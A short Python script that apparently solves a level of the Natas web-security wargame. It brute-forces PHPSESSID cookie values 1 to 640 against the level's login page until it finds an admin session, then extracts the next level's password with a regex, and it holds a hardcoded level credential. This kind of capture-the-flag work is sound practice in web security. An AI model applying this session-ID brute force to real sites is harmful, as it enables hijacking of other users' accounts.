# -*- coding: utf-8 -*-
from base import get_page, post_page
import re
from time import sleep

def natas18():
    username = "natas18"
    password = "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP"

    for i in range(1, 641):
        print(i)
        cookies = {"PHPSESSID":str(i)}
        data = {"username":"admin", "password":"password"}
        content = post_page(18, username, password, url_appending="?debug", data=data, cookies=cookies)
        if "You are an admin" in content:
            print(content)
            password = re.search(r"(?<=natas19 Password: )\w{32}", content)
            if password is None:
                print("Fail to find password")
                return
            print(password.group(0))
            return
        sleep(1)

    
if __name__ == "__main__":
    natas18()
